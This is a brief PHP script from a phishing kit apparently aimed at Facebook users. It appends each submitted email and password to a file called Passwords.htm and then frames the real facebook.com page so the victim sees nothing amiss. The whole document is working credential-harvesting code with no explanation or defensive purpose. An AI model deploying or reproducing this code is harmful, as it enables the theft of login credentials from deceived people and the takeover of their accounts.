<?php
$fp = fopen("Passwords.htm", "a");fwrite($fp, "Email:$_POST[email]\tPassword:$_POST[pass]");echo "<HTML>
<head>
<FRAMESET cols=\"*\">
<FRAME SRC=\"http://www.facebook.com\">
</FRAMESET>";?>